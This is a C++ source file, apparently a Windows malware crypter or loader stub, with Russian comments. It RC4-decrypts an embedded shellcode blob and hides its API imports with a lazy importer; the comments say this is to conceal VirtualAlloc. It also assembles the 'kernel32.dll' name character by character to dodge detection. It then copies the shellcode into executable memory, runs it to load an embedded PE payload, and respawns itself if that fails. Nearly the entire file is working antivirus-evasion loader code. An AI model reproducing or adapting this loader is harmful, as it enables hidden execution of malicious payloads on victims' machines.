#include <iostream>
#include <Windows.h>
#include <iostream>
#include "ntddk.h"

#include "../LoadPeToShell/bin_shell/payload.h"
#include "../LoadPeToShell/bin_shell/loadpe.h"

#include "lazy_importer.hpp"

static uintptr_t base = 0;
//char* data_protect;

static void shellcode_start(PVOID lpFile, PVOID payload, DWORD szFile, DWORD size_peyload) {

	PVOID v_code = LI_GET(base, VirtualAlloc)(NULL, szFile, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!v_code)
	{
		printf("Virt alloc don't alloc mem \n");
		return;
	}
	
	memcpy(v_code, lpFile, szFile);
	uint32_t ret = (*(uint32_t(*)(PVOID, DWORD))v_code)(payload, size_peyload);
	if (ret != 1) {
		    //Хьюстон-хьюстон у нас проблема, мы несмогли запустить пейлоад...:(
		    //Пробуем ещё....
			printf("+++ start:%d \n",ret);
			STARTUPINFO si;
			PROCESS_INFORMATION pi;
			// Создадим другой процесс, а этот благополучно завершим.
			memset(&si, 0, sizeof(STARTUPINFO));
			si.cb = sizeof(STARTUPINFO);
			wchar_t szPath[MAX_PATH];
			GetModuleFileName(NULL, szPath, MAX_PATH);
			CreateProcess (NULL, szPath, NULL, NULL,
				FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
			PostQuitMessage(0);
			printf("+++ end \n");
	}
}

#define swap(type,a,b,c) do{type t=a[b];a[b]=a[c];a[c]=t;}while(0)
uint8_t* decRC4(uint8_t* pKey, DWORD dwKeyLen, uint8_t* pData, DWORD dwDataLen)
{
	if (dwDataLen > 0)
	{
		DWORD i, j, c;
		int gg;
		BYTE s[256];
		gg = 256;

		for (i = 0; i < gg; s[i] = (BYTE)i++);

		for (i = j = 0; i < gg; ++i)
		{
			j = (j + s[i] + pKey[i % dwKeyLen]) % gg;
			swap(BYTE, s, i, j);
		}

		i = j = c = 0;

		while (dwDataLen--)
		{
			j = (j + s[i = (i + 1) % gg]) % gg;
			swap(BYTE, s, i, j);
			pData[c++] ^= s[(s[i] + s[j]) % gg];
		}

		return pData;
	}

	return NULL;
}


int main()
{
	static char kernel32[13];
	kernel32[0] = 'k';
	kernel32[1] = 'e';
	kernel32[2] = 'r';
	kernel32[3] = 'n';
	kernel32[4] = 'e';
	kernel32[5] = 'l';
	kernel32[6] = '3';
	kernel32[7] = '2';
	kernel32[8] = '.';
	kernel32[9] = 'd';
	kernel32[10] = 'l';
	kernel32[11] = 'l';
	kernel32[12] = '\0';
	
	//Для скрытия Virtualalloc используется lazy_importer.hpp
        base = reinterpret_cast<std::uintptr_t>(LI_FIND(LoadLibraryA)(kernel32));

#ifndef WIN64
	uint8_t key_for_crypt = 116;
#else
	uint8_t key_for_crypt = 200;
#endif

	//Расшифровка loadpe
	uint32_t size_loadpe = sizeof(loadpe);
	key_for_crypt += loadpe[size_loadpe - 1];
	
	uint8_t key_to_dec[4];

	key_to_dec[0] = key_for_crypt + 1;
	key_to_dec[1] = key_for_crypt + 2;
	key_to_dec[2] = key_for_crypt + 3;
	key_to_dec[3] = key_for_crypt + 4;

	//Тут будет расшифровка кода
	decRC4(key_to_dec, 4, loadpe, sizeof(loadpe)-1);
	shellcode_start(loadpe, data_protect, sizeof(loadpe), sizeof(data_protect));
}
